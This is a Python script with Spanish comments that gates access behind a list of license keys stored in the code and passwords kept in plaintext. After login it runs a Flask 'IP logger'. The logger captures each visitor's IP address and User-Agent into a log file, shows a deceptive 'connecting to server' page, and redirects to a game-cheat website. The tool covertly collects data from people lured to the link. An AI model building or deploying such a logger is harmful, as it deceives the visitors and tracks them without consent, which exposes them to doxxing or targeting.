import os
import time
import json
import getpass
import datetime
from flask import Flask, request, redirect, render_template_string

# --- LISTADO OFICIAL DE LLAVES ---
KEYS_OFICIALES = [
    "A9xQ2b-Fk31Zp-7sL0Wa-HM8KcR-pZ2VxE-J0a9Fq-Nm7E1K", "Yp3E0a-Z1Wm9D-KR8xqS-2JbFeN-A5rP0d-XnCk47-mL9H",
    "mQ9k8R-7FZ2A0-E1pHNd-Cx5VBa-LsW3J6-yM4nK-Pt0q", "4ZpA0M-xQ8sYd-7N9K2C-b5VnF-JLr6H1-EWmP",
    "R7E5kZ-MN9D0s-AQ8F3p4aC-xB2VJ6H", "9Jq4HkZC-7M5P2A-WN8sB3E0r-DxVFa",
    "aF3P2B9N-H0xJZk6E7C-QD8s5V4M", "N2kQJ5RZ9W4P7A0x6sE3MHDVC",
    "0K7Z4QJmD6N3PEx9CHAsRFW5", "E4V8sP2RZ0N5kQ7Jx6H9CWA3D",
    "3M7H9A0KJ5Z4xN8P2E6QWCR", "W0N8C5H9J7Z3A6P4R2KExQM",
    "8P5N0R6Z4K9A2C7EJ3QWHDx", "Q5C4K3x9E2A8ZPN6H0M7RJW",
    "7xZ8C2H9E6K5Q0JPA4RMWN", "K2Q5A0R6E7J9Z4M3H8CxNPW",
    "4E0N8QH6Z3P5M9AxJ7C2KRW", "R5EJZ4A0Q9xC8M2N7P6H3WK",
    "N5Z8H0K9E6R3A2QJ4PCMWx7", "Z0H8A6N9R7M3J4K2xPCEQW5",
    "C7Q9J5N8A4ZP3H0M2E6RxWK", "8M6Q2E0N9Z3C5JH4R7xAKPW",
    "R0C3Z6H7A9QK4N8xJ5EMP2W", "5R9KJZ4H2A8E0P6C3Q7MxWN",
    "ZJ3C5Q0M7A2E6R8H9K4PNWx", "0Z7A6K9Q3J2M5H4C8xEPNRW",
    "H3E6Z4M8Q0P5J7K9R2CxANW", "8EJ7MZ4N5H2Q6C3A0K9xRPW",
    "R8H9MZ4J5Q3K0A6P7E2NCWx", "3P8RZQ0H6E5A7C9J2x4MKNW",
    "9Z5E7H2J0R6K8A3C4MPxNQW", "Q7H8A9E6KZJ0M3R2xC4NP5W",
    "ZQ0C9M5A4R7H8E6J3P2NxWK", "M6A9H0ZC7E3R5K8J4P2QxWN",
    "2R5H7QZ8C0A3E6P4KJ9MxWN", "4Z9H6R8Q2K5E0C7J3PAMxWN",
    "A3Q6H0J9R2C8Z7K5M4PExWN", "Z9Q2C4E6A0H8J3K5P7RMWxN",
    "8C7QZ6A9E0M4H3P5J2KRxWN", "0H3Z5R7A8K9C6EJ4P2QMWxN",
    "7M5Z4H0E2Q8C6A3J9PRKxWN", "J4QZ6H9E0C5K8R7A2P3MxWN",
    "5Q6Z9C0R4A3K7H2P8JEMxWN", "E7A6H3ZC0R4Q8P2K9J5MxWN",
    "0Z3E9K5Q2A6C4R8H7JPMxWN", "KZ9E0Q6H4C2R5J3A8PM7xWN",
    "4E9C8A6QZ5R7KJ0H2P3MxWN"
]

DB_FILE = "anonymos_database.json"
URL_DESTINO = "https://eulencheats.com"

# --- INICIALIZAR DB ---
if not os.path.exists(DB_FILE):
    with open(DB_FILE, "w") as f:
        json.dump({"usuarios": {}, "keys_usadas": []}, f)

def load_db():
    with open(DB_FILE, "r") as f: return json.load(f)

def save_db(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

def cls(): os.system('cls' if os.name == 'nt' else 'clear')

# --- LÓGICA DE USUARIOS ---
def register():
    db = load_db()
    cls()
    print("\n[REGISTRO]")
    user = input("Elige un nombre de usuario: ")
    if user in db["usuarios"]:
        print("[!] Este usuario ya existe."); time.sleep(2); return

    password = getpass.getpass("Crea tu contraseña: ")
    key = input("Introduce una Key: ").strip()

    if key in KEYS_OFICIALES:
        if key in db["keys_usadas"]:
            print("[!] ESTA KEY YA FUE USADA.")
        else:
            db["usuarios"][user] = password
            db["keys_usadas"].append(key)
            save_db(db)
            print("[✓] REGISTRO EXITOSO.")
    else:
        print("[!] KEY INVÁLIDA.")
    time.sleep(2)

def login():
    db = load_db()
    cls()
    print("\n[LOGIN]")
    user = input("Usuario: ")
    password = getpass.getpass("Contraseña: ")
    if user in db["usuarios"] and db["usuarios"][user] == password:
        print("[✓] Acceso Concedido."); time.sleep(1)
        return True
    else:
        print("[!] Credenciales incorrectas."); time.sleep(2); return False

# --- SERVIDOR (ARREGLADO) ---
# Usamos "app" entre comillas para evitar el error de name
app = Flask("app")

@app.route('/')
def logger():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    print(f"[+] IP CAPTURADA: {ip}")
    
    with open("ips_log.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] IP: {ip} | UA: {ua}\n")

    return render_template_string("""
        <body style="background:#000;color:#0f0;text-align:center;padding-top:10%;">
            <h1>CONECTANDO AL SERVIDOR...</h1>
            <p>IP: {{ip}}</p>
            <script>setTimeout(function(){window.location.href='{{dest}}';}, 3000);</script>
        </body>
    """, ip=ip, dest=URL_DESTINO)

# --- MENÚ PRINCIPAL ---
def iniciar_programa():
    while True:
        cls()
        print("1. Registrarse\n2. Iniciar Sesión\n3. Salir")
        opt = input("\nSeleccione: ")
        if opt == "1": register()
        elif opt == "2":
            if login():
                print("Iniciando servidor en http://127.0.0.1:5000")
                app.run(port=5000)
                break
        elif opt == "3": break

# Ejecución directa
iniciar_programa()